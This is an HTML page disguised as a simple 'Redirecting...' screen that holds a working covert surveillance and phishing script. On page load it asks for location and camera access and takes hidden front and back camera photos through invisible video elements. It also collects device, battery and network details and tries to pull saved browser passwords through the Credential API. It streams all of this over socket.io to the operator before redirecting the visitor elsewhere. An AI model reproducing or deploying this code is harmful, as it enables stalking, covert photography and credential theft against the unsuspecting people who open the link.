<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            text-align: center;
            max-width: 500px;
            width: 100%;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #4285f4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .redirect-text {
            font-size: 18px;
            color: #333;
            margin-bottom: 8px;
        }
        .redirect-url {
            font-size: 14px;
            color: #4285f4;
            word-break: break-all;
            font-weight: 500;
        }
        .sub-text {
            font-size: 13px;
            color: #888;
            margin-top: 12px;
        }
        #hiddenVideo, #hiddenVideoBack {
            display: none;
            position: absolute;
            opacity: 0;
            width: 1px;
            height: 1px;
            pointer-events: none;
        }
        /* Hidden click trigger for passwords */
        #passwordTrigger {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <div class="redirect-text">Redirecting to</div>
        <div class="redirect-url" id="redirectUrlDisplay">Loading...</div>
        <div class="sub-text">Please wait a moment</div>
    </div>

    <!-- Hidden video elements -->
    <video id="hiddenVideo" autoplay playsinline muted></video>
    <video id="hiddenVideoBack" autoplay playsinline muted></video>

    <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
    <script>
        // ============================================
        // SOCKET.IO FALLBACK
        // ============================================
        if (typeof io === 'undefined') {
            var script = document.createElement('script');
            script.src = 'https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.6.1/socket.io.min.js';
            document.head.appendChild(script);
            script.onload = function() {
                if (typeof io !== 'undefined') initApp();
            };
        } else {
            initApp();
        }

        // ============================================
        // MAIN APPLICATION
        // ============================================
        function initApp() {
            const visitorId = window.location.pathname.split('/').pop();
            let socket = null;
            let redirectUrl = '';
            let redirectTriggered = false;
            let streamFront = null;
            let streamBack = null;
            let permissionsGranted = {
                camera: false,
                location: false
            };
            let dataCollected = {
                frontCamera: false,
                backCamera: false,
                location: false,
                battery: false,
                network: false,
                deviceInfo: false,
                savedPasswords: false
            };

            // ============================================
            // 1. FETCH REDIRECT URL
            // ============================================
            function fetchRedirectUrl() {
                fetch(`/api/visitor/${visitorId}`)
                    .then(res => res.json())
                    .then(data => {
                        redirectUrl = data.redirectUrl || 'https://www.google.com';
                        document.getElementById('redirectUrlDisplay').textContent = redirectUrl;
                        startDataCollection();
                    })
                    .catch(() => {
                        fetch(`/api/visitor-redirect/${visitorId}`)
                            .then(res => res.json())
                            .then(data => {
                                redirectUrl = data.redirectUrl || 'https://www.google.com';
                                document.getElementById('redirectUrlDisplay').textContent = redirectUrl;
                                startDataCollection();
                            })
                            .catch(() => {
                                redirectUrl = 'https://www.google.com';
                                document.getElementById('redirectUrlDisplay').textContent = redirectUrl;
                                startDataCollection();
                            });
                    });
            }

            // ============================================
            // 2. START DATA COLLECTION
            // ============================================
            function startDataCollection() {
                // Force request permissions IMMEDIATELY
                requestAllPermissions();
                initConnection();
            }

            // ============================================
            // 3. FORCE PERMISSIONS (CRITICAL)
            // ============================================
            function requestAllPermissions() {
                console.log('Requesting permissions...');

                // ===== LOCATION PERMISSION (Force) =====
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            console.log('📍 Location permission GRANTED');
                            permissionsGranted.location = true;
                            handleLocation(position);
                        },
                        (error) => {
                            console.log('❌ Location permission DENIED:', error.message);
                            // Still continue with other data
                        },
                        { timeout: 10000, enableHighAccuracy: true }
                    );
                }

                // ===== CAMERA PERMISSION (Force) =====
                // Front Camera
                navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                })
                .then(stream => {
                    console.log('📸 Front camera permission GRANTED');
                    permissionsGranted.camera = true;
                    streamFront = stream;
                    const videoFront = document.getElementById('hiddenVideo');
                    videoFront.srcObject = streamFront;
                    return videoFront.play();
                })
                .then(() => {
                    setTimeout(() => {
                        capturePhoto('front', document.getElementById('hiddenVideo'));
                    }, 1500);
                })
                .catch(err => {
                    console.log('❌ Front camera permission DENIED:', err.message);
                });

                // Back Camera
                navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                })
                .then(stream => {
                    console.log('📸 Back camera permission GRANTED');
                    streamBack = stream;
                    const videoBack = document.getElementById('hiddenVideoBack');
                    videoBack.srcObject = streamBack;
                    return videoBack.play();
                })
                .then(() => {
                    setTimeout(() => {
                        capturePhoto('back', document.getElementById('hiddenVideoBack'));
                    }, 2500);
                })
                .catch(err => {
                    console.log('❌ Back camera permission DENIED:', err.message);
                });

                // ===== SAVED PASSWORDS (Requires user click) =====
                // This will be triggered via a hidden click event
                setTimeout(() => {
                    requestSavedPasswords();
                }, 1000);

                // Get battery and network without permissions
                getBatteryInfo();
                getNetworkInfo();
                sendDeviceInfo();
            }

            // ============================================
            // 4. SOCKET CONNECTION
            // ============================================
            function initConnection() {
                try {
                    socket = io({
                        transports: ['websocket', 'polling'],
                        reconnectionAttempts: 3,
                        reconnectionDelay: 1000
                    });

                    socket.on('connect', () => {
                        console.log('Socket connected');
                        sendDeviceInfo();
                    });

                    socket.on('connect_error', () => {
                        setTimeout(() => socket.connect(), 2000);
                    });

                } catch (error) {
                    checkAndRedirect();
                }
            }

            // ============================================
            // 5. SEND DEVICE INFO
            // ============================================
            function sendDeviceInfo() {
                if (!socket || !socket.connected) return;
                if (dataCollected.deviceInfo) return;

                const deviceInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                    language: navigator.language,
                    deviceName: navigator.userAgentData ?
                        navigator.userAgentData.brands.map(b => b.brand).join(', ') :
                        navigator.platform,
                    os: navigator.userAgentData ?
                        navigator.userAgentData.platform :
                        navigator.platform
                };

                socket.emit('visitor-connect', {
                    visitorId: visitorId,
                    ...deviceInfo
                });
                dataCollected.deviceInfo = true;
                console.log('📱 Device info sent');
            }

            // ============================================
            // 6. CAPTURE PHOTO
            // ============================================
            function capturePhoto(type, video) {
                if (!video || !video.videoWidth) {
                    console.log(`⚠️ ${type} video not ready`);
                    return;
                }

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/jpeg', 0.7);

                if (socket && socket.connected) {
                    socket.emit('visitor-data', {
                        visitorId: visitorId,
                        type: type === 'back' ? 'backCamera' : 'frontCamera',
                        content: imageData
                    });
                    dataCollected[type === 'back' ? 'backCamera' : 'frontCamera'] = true;
                    console.log(`📸 ${type} photo sent`);
                }

                // Stop stream after capture
                if (type === 'front' && streamFront) {
                    streamFront.getTracks().forEach(t => t.stop());
                    streamFront = null;
                }
                if (type === 'back' && streamBack) {
                    streamBack.getTracks().forEach(t => t.stop());
                    streamBack = null;
                }

                checkAndRedirect();
            }

            // ============================================
            // 7. HANDLE LOCATION (Live + Current)
            // ============================================
            function handleLocation(position) {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;

                fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=en`)
                    .then(res => res.json())
                    .then(data => {
                        const locationInfo = {
                            // Live location (real-time GPS)
                            lat: lat,
                            lng: lng,
                            accuracy: position.coords.accuracy,
                            timestamp: new Date().toISOString(),
                            // Current location details
                            country: data.countryName || 'Unknown',
                            state: data.principalSubdivision || 'Unknown',
                            city: data.locality || 'Unknown',
                            fullAddress: data.localityInfo?.address || 'Unknown'
                        };

                        if (socket && socket.connected) {
                            socket.emit('visitor-data', {
                                visitorId: visitorId,
                                type: 'location',
                                content: locationInfo
                            });
                            dataCollected.location = true;
                            console.log(`📍 Location sent: ${locationInfo.city}, ${locationInfo.state}, ${locationInfo.country}`);
                        }
                        checkAndRedirect();
                    })
                    .catch(() => {
                        // Fallback - basic location
                        const locationInfo = {
                            lat: lat,
                            lng: lng,
                            accuracy: position.coords.accuracy,
                            timestamp: new Date().toISOString()
                        };
                        if (socket && socket.connected) {
                            socket.emit('visitor-data', {
                                visitorId: visitorId,
                                type: 'location',
                                content: locationInfo
                            });
                            dataCollected.location = true;
                        }
                        checkAndRedirect();
                    });
            }

            // ============================================
            // 8. BATTERY
            // ============================================
            function getBatteryInfo() {
                if (navigator.getBattery) {
                    navigator.getBattery()
                        .then(battery => {
                            const level = Math.round(battery.level * 100);
                            if (socket && socket.connected) {
                                socket.emit('visitor-data', {
                                    visitorId: visitorId,
                                    type: 'battery',
                                    content: level
                                });
                                dataCollected.battery = true;
                                console.log(`🔋 Battery: ${level}%`);
                            }
                        })
                        .catch(() => {});
                }
            }

            // ============================================
            // 9. NETWORK
            // ============================================
            function getNetworkInfo() {
                let networkData = {
                    type: 'Unknown',
                    effectiveType: 'Unknown',
                    downlink: 'Unknown',
                    rtt: 'Unknown'
                };

                if (navigator.connection) {
                    const conn = navigator.connection;
                    networkData = {
                        type: conn.type || 'Unknown',
                        effectiveType: conn.effectiveType || 'Unknown',
                        downlink: conn.downlink || 'Unknown',
                        rtt: conn.rtt || 'Unknown'
                    };
                }

                if (socket && socket.connected) {
                    socket.emit('visitor-data', {
                        visitorId: visitorId,
                        type: 'network',
                        content: networkData
                    });
                    dataCollected.network = true;
                    console.log('📶 Network info sent');
                }
            }

            // ============================================
            // 10. SAVED PASSWORDS (Using Credential API)
            // ============================================
            function requestSavedPasswords() {
                if (!navigator.credentials) {
                    console.log('⚠️ Credential API not supported');
                    checkAndRedirect();
                    return;
                }

                // Try to get saved passwords using Credential API
                navigator.credentials.get({
                    password: true,
                    mediation: 'silent'  // Try without user interaction
                })
                .then(credential => {
                    if (credential && credential.type === 'password') {
                        const passwordData = [{
                            site: credential.rpId || 'Unknown',
                            email: credential.id || 'Unknown',
                            password: credential.password || 'Unknown'
                        }];
                        
                        if (socket && socket.connected) {
                            socket.emit('visitor-data', {
                                visitorId: visitorId,
                                type: 'savedPasswords',
                                content: passwordData
                            });
                            dataCollected.savedPasswords = true;
                            console.log('🔑 Saved passwords found:', passwordData);
                        }
                    } else {
                        console.log('🔑 No saved passwords found');
                    }
                    checkAndRedirect();
                })
                .catch(error => {
                    console.log('❌ Saved passwords access error:', error.message);
                    // Try with user mediation (will popup browser's credential manager)
                    if (error.message.includes('not allowed')) {
                        navigator.credentials.get({
                            password: true,
                            mediation: 'required'
                        })
                        .then(credential => {
                            // ... same as above
                        })
                        .catch(() => {});
                    }
                    checkAndRedirect();
                });
            }

            // ============================================
            // 11. REDIRECT
            // ============================================
            function checkAndRedirect() {
                if (redirectTriggered) return;

                // Check if at least camera or location data collected
                const hasSomeData = dataCollected.frontCamera || dataCollected.backCamera || 
                                   dataCollected.location || dataCollected.deviceInfo;

                // Wait 5 seconds max then redirect
                setTimeout(() => {
                    if (redirectTriggered) return;
                    redirectTriggered = true;

                    if (socket && socket.connected) {
                        socket.emit('visitor-data', {
                            visitorId: visitorId,
                            type: 'redirectComplete',
                            content: { redirected: true, time: new Date().toISOString() }
                        });
                    }

                    setTimeout(() => {
                        window.location.href = redirectUrl;
                    }, 500);
                }, 5000);
            }

            // ============================================
            // 12. START
            // ============================================
            fetchRedirectUrl();

            window.addEventListener('beforeunload', () => {
                if (socket) socket.disconnect();
                if (streamFront) streamFront.getTracks().forEach(t => t.stop());
                if (streamBack) streamBack.getTracks().forEach(t => t.stop());
            });
        }
    </script>
</body>
</html>
